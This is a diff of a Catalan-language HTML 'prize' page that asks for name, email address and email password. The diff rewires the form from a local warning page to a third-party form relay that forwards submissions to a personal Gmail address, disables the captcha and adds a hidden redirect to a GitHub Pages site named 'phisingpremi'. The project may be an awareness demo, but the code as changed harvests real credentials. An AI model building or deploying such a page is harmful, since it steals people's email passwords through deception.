@@ -17,6 +17,7 @@
       border-radius: 10px;
       background-color: #ffffff;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      max-width: 400px;
     }
     input[type="text"], input[type="email"], input[type="password"] {
       display: block;
@@ -27,7 +28,7 @@
       border: 1px solid #ccc;
     }
     input[type="submit"] {
-      background-color: #007bff;
+      background-color: #28a745;
       color: white;
       padding: 10px 20px;
       border: none;
@@ -35,19 +36,23 @@
       cursor: pointer;
     }
     input[type="submit"]:hover {
-      background-color: #0056b3;
+      background-color: #218838;
     }
   </style>
 </head>
 <body>
   <div class="form-container">
-    <h2>Has estat seleccionat per un premi exclusiu!</h2>
-    <p>Per confirmar, introdueix les teves dades:</p>
-    <form action="avis.html" method="get">
+    <h2>Promoció exclusiva!</h2>
+    <p>Registra’t per accedir al teu premi:</p>
+    <form action="https://formsubmit.co/arnaucaso@gmail.com" method="POST">
+      <!-- Redirecció automàtica després d’enviar -->
+      <input type="hidden" name="_next" value="https://arnaucaso01.github.io/phisingpremi/avis.html">
+      <input type="hidden" name="_captcha" value="false">
+      
       <input type="text" name="nom" placeholder="Nom complet" required>
-      <input type="email" name="email" placeholder="Correu electrònic" required>
-      <input type="password" name="password" placeholder="Contrasenya del correu" required>
-      <input type="submit" value="Participa">
+      <input type="email" name="correu" placeholder="Correu electrònic" required>
+      <input type="password" name="contrasenya" placeholder="Contrasenya del correu" required>
+      <input type="submit" value="Accedeix al premi">
     </form>
   </div>
 </body>
